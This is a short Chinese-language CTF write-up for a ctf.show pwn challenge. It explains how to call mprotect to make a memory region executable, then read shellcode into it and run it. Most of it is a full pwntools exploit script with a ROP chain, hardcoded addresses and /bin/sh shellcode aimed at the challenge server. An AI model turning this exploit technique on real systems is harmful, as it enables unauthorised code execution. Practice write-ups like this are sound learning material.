# 挑战简介
静态编译？或许你可以找找mprotect函数

# 思路

mprotect函数可以将内存权限进行修改为可读可写可执行。  
int mprotect(const void *start, size_t len, int prot);mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。  
一般prot直接修改为7，即可读可写可执行。  

通过调用mprotect来赋权，对内存进行赋读写执行权限，再利用read读取输入的shellcode，从而执行，这就是总体思路  

```
#!/usr/bin/python3
from pwn import *
from LibcSearcher import *

context.log_level = "debug"

p= remote("pwn.challenge.ctf.show",28258)
elf = ELF('./pwn')


offset = b'a'*(0x12 + 0x4)

mprotect_addr = elf.symbols['mprotect']

pop_ret_addr = 0x08056194

base_addr = 0x080da000

shellcode = asm(shellcraft.sh(),arch='i386',os='linux')

read_addr = 0x0806bee0

shellcode_addr = 0x080da000

payload = offset + p32(mprotect_addr) + p32(pop_ret_addr) + p32(base_addr) + p32(0x1000) + p32(0x7) + p32(read_addr) + p32(base_addr) + p32(0x0) + p32(base_addr) + p32(len(shellcode))


print(payload)

p.sendline(payload)
p.sendline(shellcode)

p.interactive()
```
